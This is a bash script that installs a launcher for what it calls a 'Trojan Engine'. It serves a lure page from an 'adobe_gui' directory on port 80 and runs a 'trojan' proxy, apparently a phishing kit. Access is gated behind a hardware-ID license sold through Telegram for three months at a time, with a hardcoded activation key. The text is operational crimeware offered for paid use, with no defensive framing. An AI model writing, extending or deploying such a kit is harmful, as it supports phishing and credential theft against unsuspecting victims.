# 7. THE "TROJAN PAGE" & 3-MONTH LICENSE SYSTEM
cat << 'EOF' > /root/run.sh
#!/bin/bash
# --- COLORS ---
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

LICENSE_FILE="/root/.license"
CURRENT_DATE=$(date +%s)

# --- HWID GENERATOR ---
HWID=$(hostnamectl | grep "Static hostname" | awk '{print $3}')-$(lscpu | grep "Model" | md5sum | cut -c1-8 | tr '[:lower:]' '[:upper:]')

# --- CHECK IF LICENSE EXISTS AND IS VALID ---
if [ -f "$LICENSE_FILE" ]; then
    EXPIRY_DATE=$(cat "$LICENSE_FILE" | cut -d':' -f2)
    if [ "$CURRENT_DATE" -lt "$EXPIRY_DATE" ]; then
        # LICENSE IS VALID - START SILENTLY
        sudo fuser -k 80/tcp 443/tcp 2>/dev/null
        pkill proxy && pkill php
        screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
        screen -dmS trojan /root/engine/dist/proxy -config /root/config.json
        echo -e "${GREEN}[+] License Active. Trojan Engine is LIVE.${NC}"
        exit 0
    else
        echo -e "${RED}[!] YOUR 3-MONTH LICENSE HAS EXPIRED.${NC}"
        rm "$LICENSE_FILE"
    fi
fi

# --- SHOW TROJAN PAGE (IF EXPIRED OR NEW) ---
clear
echo -e "${BLUE}"
echo " ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗"
echo " ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║"
echo "    ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║"
echo "    ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║"
echo "    ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║"
echo "    ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝"
echo -e "${NC}"
echo -e "${RED}             [ SYSTEM UNAUTHORIZED ]${NC}"
echo " -------------------------------------------------------"
echo -e "${RED}[error] $(date +%H:%M:%S) received status 401 Unauthorized.${NC}"
echo -e "${RED}[error] Hardware ID $HWID is not registered.${NC}"
echo -e "${BLUE}[important] Send HWID to @YourUsername on TG for 3-Month Activation.${NC}"
echo " -------------------------------------------------------"

read -p "ENTER ACTIVATION KEY: " USER_KEY

# IN YOUR TG: Provide him a key like "ACTIVATE-XYZ"
# For this logic, we will just simulate a master key for now
if [ "$USER_KEY" == "MY-SECRET-99" ]; then
    # Set expiry to 90 days from now (90 * 24 * 60 * 60 seconds)
    EXPIRY=$(($CURRENT_DATE + 7776000))
    echo "$HWID:$EXPIRY" > "$LICENSE_FILE"
    echo -e "${GREEN}[success] Activated! Valid for 3 months.${NC}"
    ./run.sh
else
    exit 1
fi
EOF
chmod +x /root/run.sh
